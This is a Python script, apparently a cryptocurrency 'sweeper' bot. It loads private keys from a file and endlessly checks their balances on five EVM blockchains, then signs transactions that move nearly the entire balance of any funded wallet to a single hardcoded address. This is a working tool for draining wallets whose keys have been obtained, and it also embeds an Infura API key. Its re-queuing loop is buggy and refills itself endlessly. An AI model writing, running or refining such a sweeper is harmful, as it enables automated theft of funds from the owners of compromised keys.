import asyncio
from web3 import Web3
import time
import aiohttp
from threading import Thread
from queue import Queue
import itertools
address_to_withdraw = '0x42FeD1c47A0F60CE3c25a505b70913210d400F9A'
ERROR_DELAY = 30
MAX_RETRIES = 10
keys_with_balance_queue = Queue()

NETWORKS = {
    'bsc': {
        'RPC_URL': 'https://bsc-dataseed.binance.org/',
        'CHAIN_ID': 56,
        'NAME': 'bsc',
        'SCAN_URL': 'https://bscscan.com/tx/',
        'GAS_PRICE': 10000000000
    },
    'matic': {
        'RPC_URL': 'https://polygon-rpc.com',
        'CHAIN_ID': 137,
        'NAME': 'matic',
        'SCAN_URL': 'https://polygonscan.com/tx/',
        'GAS_PRICE': 30000000000
    },
    'avax': {
        'RPC_URL': 'https://api.avax.network/ext/bc/C/rpc',
        'CHAIN_ID': 43114,
        'NAME': 'avax',
        'SCAN_URL': 'https://cchain.explorer.avax.network/tx/',
        'GAS_PRICE': 20000000000
    },
    'fantom': {
        'RPC_URL': 'https://rpc.ftm.tools/',
        'CHAIN_ID': 250,
        'NAME': 'fantom',
        'SCAN_URL': 'https://ftmscan.com/tx/',
        'GAS_PRICE': 80000000000
    },
    'eth': {
        'RPC_URL': 'https://mainnet.infura.io/v3/9aa3d95b3bc440fa88ea12eaa4456161',
        'CHAIN_ID': 1,
        'NAME': 'eth',
        'SCAN_URL': 'https://etherscan.io/tx/',
        'GAS_PRICE': 25000000000
    }
}
NETWORK_RATES = {
    'bsc': 10,
    'matic': 10,
    'avax': 15,
    'fantom': 15,
    'eth': 15
}
NETWORK_SEMAPHORES = {network: asyncio.Semaphore(NETWORK_RATES[network]) for network in NETWORKS.keys()}

def log_to_file(message, filename='log.txt'):
    with open(filename, 'a', encoding='utf-8') as f:
        current_time = time.strftime('%Y-%m-%d %H:%M:%S')
        f.write(f"{current_time} - {message}\n")
        
def read_file_keys():
    def is_valid_ethereum_key(s):
        try:
            int(s, 16)
            return len(s) == 64
        except ValueError:
            return False

    file_keys = []
    try:
        with open('private_keys.txt', 'r', encoding='utf-8') as f:
            keys = f.readlines()
            for key in keys:
                cleaned_key = key.strip()
                if is_valid_ethereum_key(cleaned_key):
                    file_keys.append(cleaned_key)
                else:
                    log_to_file(f"Invalid key found: {key}")
        num_keys = len(file_keys)
        log_to_file(f"Loaded {num_keys} private keys. Start")
        return file_keys
    except Exception as err:
        log_to_file(f"Failed to read file_keys.txt - {err}")
        return []

def auto_withdraw(to_address):
    print("Starting auto_withdraw function")
    web3_instance = Web3()
    try:
        to_address = web3_instance.toChecksumAddress(to_address.lower())
    except Exception as err:
        log_to_file(f"Error in address to withdraw - {err}")

    for network_name, network_data in NETWORKS.items():
        try:
            web3 = Web3(Web3.HTTPProvider(network_data['RPC_URL']))
            web3.eth.account.enable_unaudited_hdwallet_features()
            network_data['WEB3_INSTANCE'] = web3
        except Exception as err:
            log_to_file(str(err))
            continue
    return NETWORKS

def token_transfer_thread(networks, to_address):
    while True:
        key_with_balance = keys_with_balance_queue.get()
        time.sleep(0.3)
        token_transfer([key_with_balance], networks, to_address)

def token_transfer(keys_with_balance, networks, to_address):
    global keys_with_balance_queue
    for key_with_balance in keys_with_balance:
        for network_name, token in networks.items():
            token_rpc = token['RPC_URL']
            token_id = token['CHAIN_ID']
            token_name = token['NAME']
            token_url = token['SCAN_URL']
            web3 = networks[network_name]['WEB3_INSTANCE']
            keys_with_balance_queue.put(key_with_balance)
           # print(f'Ключ от {key_with_balance} записан в очередь')  
            if not web3:
                log_to_file(f"Connection failed for {token_rpc}, skipping.")
                continue
            try:
                account = web3.eth.account.from_key(key_with_balance.strip())
                account_address = account.address
                nonce = web3.eth.get_transaction_count(account_address, "pending")
                balance = web3.eth.get_balance(account_address)
                gas_price = networks[network_name]['GAS_PRICE']
                estimate = web3.eth.estimate_gas({'to': to_address, 'from': account_address, 'value': balance})
                gas_cost = gas_price * estimate
                if balance <= gas_cost:
                    continue

                send_value = balance - gas_cost
                tx = {
                    'nonce': nonce,
                    'to': to_address,
                    'gas': estimate,
                    'value': send_value,
                    'gasPrice': gas_price
                }

                if token_id:
                    tx['chainId'] = token_id

                signed_tx = web3.eth.account.sign_transaction(tx, key_with_balance)
                tx_hash = web3.eth.sendRawTransaction(signed_tx.rawTransaction)
                log_to_file(f'Transferred {web3.fromWei(send_value, "ether")} {token_name}, Sender address: {account_address}, Transaction hash: {token_url}{tx_hash.hex()}')
            except ValueError as e:
                log_to_file(str(e))
                if 'insufficient funds for gas' in str(e) or 'execution reverted' in str(e) or 'unknown account' in str(e):
                    break
                if 'nonce' in str(e) or 'underpriced' in str(e) or 'already known' in str(e):
                    continue
                if 'Client Error' in str(e) or 'Server Error' in str(e) or 'Could not decode' in str(e):
                    continue

            except Exception as err:
                log_to_file(str(err))

async def rpc_request(session, method, params, network):
    config = NETWORKS.get(network, None)
    headers = {"content-type": "application/json"}
    request_data = {
        "jsonrpc": "2.0",
        "id": 1,
        "method": method,
        "params": params
    }    
    async with NETWORK_SEMAPHORES[network]:
        for attempt in range(MAX_RETRIES):
            try:
                async with session.post(config['RPC_URL'], json=request_data, headers=headers) as response:
                    data = await response.json()
                    if "result" in data:
                        return data["result"]
            except Exception as e:
                if attempt < MAX_RETRIES - 1:
                    await asyncio.sleep(ERROR_DELAY)
            await asyncio.sleep(1 / NETWORK_RATES[network])
    return None


async def network_loop_file_keys_generic(session, file_keys, address_to_withdraw, tokens, network_name):
    rate_limit = NETWORK_RATES[network_name]
    semaphore = asyncio.Semaphore(rate_limit)   
    delay_interval = 1.0 / (rate_limit - 1)
    
    async def task_wrapper(private_key):
        async with semaphore:
            await check_balance(session, private_key, network_name)

    file_keys_cycled = itertools.cycle(file_keys)
    tasks = set()

    try:
        while True:
            key = next(file_keys_cycled)
            task = asyncio.ensure_future(task_wrapper(key))
            tasks.add(task)

            # Ожидаем завершения одной из задач перед созданием следующей
            done, _ = await asyncio.wait(tasks, return_when=asyncio.FIRST_COMPLETED)
            tasks -= done  # Удаляем завершенные задачи из набора

            # Добавим задержку на основе rate_limit
            await asyncio.sleep(delay_interval)

    except Exception as e:
        log_to_file(f"Ошибка при выполнении задачи для {network_name}: {e} - тип: {type(e)}")


async def network_loop_file_keys_eth(session, file_keys, address_to_withdraw, tokens):
    await network_loop_file_keys_generic(session, file_keys, address_to_withdraw, tokens, 'eth')
            
async def network_loop_file_keys_bsc(session, file_keys, address_to_withdraw, tokens):
    await network_loop_file_keys_generic(session, file_keys, address_to_withdraw, tokens, 'bsc')     
            
async def network_loop_file_keys_matic(session, file_keys, address_to_withdraw, tokens):
    await network_loop_file_keys_generic(session, file_keys, address_to_withdraw, tokens, 'matic') 
           
async def network_loop_file_keys_fantom(session, file_keys, address_to_withdraw, tokens):
    await network_loop_file_keys_generic(session, file_keys, address_to_withdraw, tokens, 'fantom') 

async def network_loop_file_keys_avax(session, file_keys, address_to_withdraw, tokens):
    await network_loop_file_keys_generic(session, file_keys, address_to_withdraw, tokens, 'avax') 
          
async def check_balance(session, private_key, network):
    web3 = Web3()
    try:
        address = web3.eth.account.from_key(private_key.strip()).address
        balance = await rpc_request(session, "eth_getBalance", [address, "latest"], network)     
        if balance:
            try:
                balance_float = int(balance, 16) / 10**18
                balance_str = format(balance_float, '.5f')
            except ValueError:
                log_to_file(f"ValueError for address {address} with balance: {balance}")
                balance_str = "0"
        else:
            balance_str = "0"

      #  print(f"Address {address} on {network} has balance: {balance_str}")
        global keys_with_balance_queue
        if float(balance_str) > 0.002:
            keys_with_balance_queue.put(private_key)
            return private_key
        else:
            return None
    except Exception as ex:
        log_to_file(f"Error checking balance for private key {private_key}: {ex}")
        return None

async def main_loop(address_to_withdraw):
    tokens = auto_withdraw(address_to_withdraw)
    file_keys = read_file_keys()
    transfer_thread = Thread(target=token_transfer_thread, args=(NETWORKS, address_to_withdraw,))
    transfer_thread.start()   
    tasks = []
    async with aiohttp.ClientSession() as session:  
        tasks.append(network_loop_file_keys_avax(session, file_keys, address_to_withdraw, tokens))
        tasks.append(network_loop_file_keys_bsc(session, file_keys, address_to_withdraw, tokens))
        tasks.append(network_loop_file_keys_eth(session, file_keys, address_to_withdraw, tokens))
        tasks.append(network_loop_file_keys_fantom(session, file_keys, address_to_withdraw, tokens))
        tasks.append(network_loop_file_keys_matic(session, file_keys, address_to_withdraw, tokens))
        await asyncio.gather(*tasks)

if __name__ == '__main__':
    loop = asyncio.get_event_loop()
    loop.run_until_complete(main_loop(address_to_withdraw))